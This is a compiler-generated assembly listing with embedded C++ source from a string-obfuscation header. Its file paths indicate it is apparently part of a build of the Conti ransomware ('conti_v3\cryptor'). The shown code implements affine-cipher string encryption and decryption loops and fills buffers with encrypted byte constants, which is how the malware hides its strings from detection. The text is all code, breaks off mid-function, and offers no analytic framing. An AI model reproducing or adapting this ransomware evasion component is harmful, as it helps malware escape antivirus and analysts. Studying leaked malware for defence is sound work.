  000db	c6 41 37 75	 mov	 BYTE PTR [rcx+55], 117	; 00000075H
  000df	c6 41 38 03	 mov	 BYTE PTR [rcx+56], 3
  000e3	c6 41 39 04	 mov	 BYTE PTR [rcx+57], 4
  000e7	c6 41 3a 03	 mov	 BYTE PTR [rcx+58], 3
  000eb	c6 41 3b 06	 mov	 BYTE PTR [rcx+59], 6
  000ef	c6 41 3c 03	 mov	 BYTE PTR [rcx+60], 3
  000f3	c6 41 3d 03	 mov	 BYTE PTR [rcx+61], 3
  000f7	c6 41 3e 03	 mov	 BYTE PTR [rcx+62], 3
  000fb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000ff	48 8b c1	 mov	 rax, rcx
  00102	c3		 ret	 0
??0?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 34 00 00
	00		 mov	 r10d, 52		; 00000034H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5c 00 00 00	 mov	 eax, 92			; 0000005cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 03	 mov	 BYTE PTR [rcx+1], 3
  00007	c6 41 02 5c	 mov	 BYTE PTR [rcx+2], 92	; 0000005cH
  0000b	c6 41 03 6f	 mov	 BYTE PTR [rcx+3], 111	; 0000006fH
  0000f	c6 41 04 5c	 mov	 BYTE PTR [rcx+4], 92	; 0000005cH
  00013	c6 41 05 6b	 mov	 BYTE PTR [rcx+5], 107	; 0000006bH
  00017	c6 41 06 5c	 mov	 BYTE PTR [rcx+6], 92	; 0000005cH
  0001b	c6 41 07 50	 mov	 BYTE PTR [rcx+7], 80	; 00000050H
  0001f	c6 41 08 5c	 mov	 BYTE PTR [rcx+8], 92	; 0000005cH
  00023	c6 41 09 1b	 mov	 BYTE PTR [rcx+9], 27
  00027	c6 41 0a 5c	 mov	 BYTE PTR [rcx+10], 92	; 0000005cH
  0002b	c6 41 0b 04	 mov	 BYTE PTR [rcx+11], 4
  0002f	c6 41 0c 5c	 mov	 BYTE PTR [rcx+12], 92	; 0000005cH
  00033	c6 41 0d 2a	 mov	 BYTE PTR [rcx+13], 42	; 0000002aH
  00037	c6 41 0e 5c	 mov	 BYTE PTR [rcx+14], 92	; 0000005cH
  0003b	c6 41 0f 60	 mov	 BYTE PTR [rcx+15], 96	; 00000060H
  0003f	c6 41 10 5c	 mov	 BYTE PTR [rcx+16], 92	; 0000005cH
  00043	c6 41 11 64	 mov	 BYTE PTR [rcx+17], 100	; 00000064H
  00047	c6 41 12 5c	 mov	 BYTE PTR [rcx+18], 92	; 0000005cH
  0004b	c6 41 13 6f	 mov	 BYTE PTR [rcx+19], 111	; 0000006fH
  0004f	c6 41 14 5c	 mov	 BYTE PTR [rcx+20], 92	; 0000005cH
  00053	c6 41 15 1b	 mov	 BYTE PTR [rcx+21], 27
  00057	c6 41 16 5c	 mov	 BYTE PTR [rcx+22], 92	; 0000005cH
  0005b	c6 41 17 64	 mov	 BYTE PTR [rcx+23], 100	; 00000064H
  0005f	c6 41 18 5c	 mov	 BYTE PTR [rcx+24], 92	; 0000005cH
  00063	c6 41 19 04	 mov	 BYTE PTR [rcx+25], 4
  00067	c6 41 1a 5c	 mov	 BYTE PTR [rcx+26], 92	; 0000005cH
  0006b	c6 41 1b 3c	 mov	 BYTE PTR [rcx+27], 60	; 0000003cH
  0006f	c6 41 1c 5c	 mov	 BYTE PTR [rcx+28], 92	; 0000005cH
  00073	c6 41 1d 09	 mov	 BYTE PTR [rcx+29], 9
  00077	c6 41 1e 5c	 mov	 BYTE PTR [rcx+30], 92	; 0000005cH
  0007b	c6 41 1f 7d	 mov	 BYTE PTR [rcx+31], 125	; 0000007dH
  0007f	c6 41 20 5c	 mov	 BYTE PTR [rcx+32], 92	; 0000005cH
  00083	c6 41 21 1b	 mov	 BYTE PTR [rcx+33], 27
  00087	c6 41 22 5c	 mov	 BYTE PTR [rcx+34], 92	; 0000005cH
  0008b	c6 41 23 04	 mov	 BYTE PTR [rcx+35], 4
  0008f	c6 41 24 5c	 mov	 BYTE PTR [rcx+36], 92	; 0000005cH
  00093	c6 41 25 1b	 mov	 BYTE PTR [rcx+37], 27
  00097	c6 41 26 5c	 mov	 BYTE PTR [rcx+38], 92	; 0000005cH
  0009b	c6 41 27 3c	 mov	 BYTE PTR [rcx+39], 60	; 0000003cH
  0009f	c6 41 28 5c	 mov	 BYTE PTR [rcx+40], 92	; 0000005cH
  000a3	c6 41 29 60	 mov	 BYTE PTR [rcx+41], 96	; 00000060H
  000a7	c6 41 2a 5c	 mov	 BYTE PTR [rcx+42], 92	; 0000005cH
  000ab	c6 41 2b 64	 mov	 BYTE PTR [rcx+43], 100	; 00000064H
  000af	c6 41 2c 5c	 mov	 BYTE PTR [rcx+44], 92	; 0000005cH
  000b3	c6 41 2d 6f	 mov	 BYTE PTR [rcx+45], 111	; 0000006fH
  000b7	c6 41 2e 5c	 mov	 BYTE PTR [rcx+46], 92	; 0000005cH
  000bb	c6 41 2f 47	 mov	 BYTE PTR [rcx+47], 71	; 00000047H
  000bf	c6 41 30 5c	 mov	 BYTE PTR [rcx+48], 92	; 0000005cH
  000c3	c6 41 31 1d	 mov	 BYTE PTR [rcx+49], 29
  000c7	c6 41 32 5c	 mov	 BYTE PTR [rcx+50], 92	; 0000005cH
  000cb	c6 41 33 5c	 mov	 BYTE PTR [rcx+51], 92	; 0000005cH
  000cf	c6 41 34 5c	 mov	 BYTE PTR [rcx+52], 92	; 0000005cH
  000d3	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000d7	48 8b c1	 mov	 rax, rcx
  000da	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 26 00 00
	00		 mov	 r10d, 38		; 00000026H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 53 00 00 00	 mov	 eax, 83			; 00000053H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 64	 mov	 BYTE PTR [rcx+1], 100	; 00000064H
  00007	c6 41 02 53	 mov	 BYTE PTR [rcx+2], 83	; 00000053H
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 53	 mov	 BYTE PTR [rcx+4], 83	; 00000053H
  00013	c6 41 05 49	 mov	 BYTE PTR [rcx+5], 73	; 00000049H
  00017	c6 41 06 53	 mov	 BYTE PTR [rcx+6], 83	; 00000053H
  0001b	c6 41 07 5b	 mov	 BYTE PTR [rcx+7], 91	; 0000005bH
  0001f	c6 41 08 53	 mov	 BYTE PTR [rcx+8], 83	; 00000053H
  00023	c6 41 09 54	 mov	 BYTE PTR [rcx+9], 84	; 00000054H
  00027	c6 41 0a 53	 mov	 BYTE PTR [rcx+10], 83	; 00000053H
  0002b	c6 41 0b 39	 mov	 BYTE PTR [rcx+11], 57	; 00000039H
  0002f	c6 41 0c 53	 mov	 BYTE PTR [rcx+12], 83	; 00000053H
  00033	c6 41 0d 27	 mov	 BYTE PTR [rcx+13], 39	; 00000027H
  00037	c6 41 0e 53	 mov	 BYTE PTR [rcx+14], 83	; 00000053H
  0003b	c6 41 0f 78	 mov	 BYTE PTR [rcx+15], 120	; 00000078H
  0003f	c6 41 10 53	 mov	 BYTE PTR [rcx+16], 83	; 00000053H
  00043	c6 41 11 54	 mov	 BYTE PTR [rcx+17], 84	; 00000054H
  00047	c6 41 12 53	 mov	 BYTE PTR [rcx+18], 83	; 00000053H
  0004b	c6 41 13 39	 mov	 BYTE PTR [rcx+19], 57	; 00000039H
  0004f	c6 41 14 53	 mov	 BYTE PTR [rcx+20], 83	; 00000053H
  00053	c6 41 15 3d	 mov	 BYTE PTR [rcx+21], 61	; 0000003dH
  00057	c6 41 16 53	 mov	 BYTE PTR [rcx+22], 83	; 00000053H
  0005b	c6 41 17 6b	 mov	 BYTE PTR [rcx+23], 107	; 0000006bH
  0005f	c6 41 18 53	 mov	 BYTE PTR [rcx+24], 83	; 00000053H
  00063	c6 41 19 33	 mov	 BYTE PTR [rcx+25], 51	; 00000033H
  00067	c6 41 1a 53	 mov	 BYTE PTR [rcx+26], 83	; 00000053H
  0006b	c6 41 1b 49	 mov	 BYTE PTR [rcx+27], 73	; 00000049H
  0006f	c6 41 1c 53	 mov	 BYTE PTR [rcx+28], 83	; 00000053H
  00073	c6 41 1d 78	 mov	 BYTE PTR [rcx+29], 120	; 00000078H
  00077	c6 41 1e 53	 mov	 BYTE PTR [rcx+30], 83	; 00000053H
  0007b	c6 41 1f 54	 mov	 BYTE PTR [rcx+31], 84	; 00000054H
  0007f	c6 41 20 53	 mov	 BYTE PTR [rcx+32], 83	; 00000053H
  00083	c6 41 21 3d	 mov	 BYTE PTR [rcx+33], 61	; 0000003dH
  00087	c6 41 22 53	 mov	 BYTE PTR [rcx+34], 83	; 00000053H
  0008b	c6 41 23 7d	 mov	 BYTE PTR [rcx+35], 125	; 0000007dH
  0008f	c6 41 24 53	 mov	 BYTE PTR [rcx+36], 83	; 00000053H
  00093	c6 41 25 53	 mov	 BYTE PTR [rcx+37], 83	; 00000053H
  00097	c6 41 26 53	 mov	 BYTE PTR [rcx+38], 83	; 00000053H
  0009b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0009f	48 8b c1	 mov	 rax, rcx
  000a2	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6b		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 42 00 00
	00		 mov	 r11d, 66		; 00000042H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 3c	 sub	 ecx, 60			; 0000003cH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00034	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

